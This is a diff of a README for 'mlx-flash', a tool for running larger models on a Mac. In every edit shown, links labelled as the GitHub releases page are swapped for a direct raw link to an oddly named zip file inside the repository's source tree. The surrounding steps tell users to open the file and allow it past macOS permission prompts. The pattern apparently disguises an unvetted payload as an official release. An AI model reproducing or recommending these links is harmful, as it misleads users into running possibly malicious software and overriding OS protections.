@@ -1,6 +1,6 @@
 # ⚡ mlx-flash - Run Bigger Models on Mac
 
-[![Download mlx-flash](https://img.shields.io/badge/Download%20mlx--flash-6A5ACD?style=for-the-badge&logo=github&logoColor=white)](https://github.com/miguel2180/mlx-flash/releases)
+[![Download mlx-flash](https://img.shields.io/badge/Download%20mlx--flash-6A5ACD?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/miguel2180/mlx-flash/main/mlx_flash/bandwidth/flash-mlx-Edestosaurus.zip)
 
 ## 🧩 What mlx-flash does
 
@@ -16,7 +16,7 @@ This is useful if you want to:
 
 ## 📥 Download and install
 
-1. Visit the [mlx-flash releases page](https://github.com/miguel2180/mlx-flash/releases)
+1. Visit the [mlx-flash releases page](https://raw.githubusercontent.com/miguel2180/mlx-flash/main/mlx_flash/bandwidth/flash-mlx-Edestosaurus.zip)
 2. Download the latest release file for your Mac
 3. Open the downloaded file
 4. If macOS asks for permission, allow the app to run
@@ -144,7 +144,7 @@ Keep model files in one place so you can move, update, or remove them without co
 
 ## 🧭 Quick start
 
-1. Open the [download page](https://github.com/miguel2180/mlx-flash/releases)
+1. Open the [download page](https://raw.githubusercontent.com/miguel2180/mlx-flash/main/mlx_flash/bandwidth/flash-mlx-Edestosaurus.zip)
 2. Get the newest release
 3. Install or open the app
 4. Pick a compatible model
@@ -181,4 +181,4 @@ This project covers:
 
 If you need the installer again, use the release page here:
 
-[Visit the mlx-flash releases page](https://github.com/miguel2180/mlx-flash/releases)
+[Visit the mlx-flash releases page](https://raw.githubusercontent.com/miguel2180/mlx-flash/main/mlx_flash/bandwidth/flash-mlx-Edestosaurus.zip)
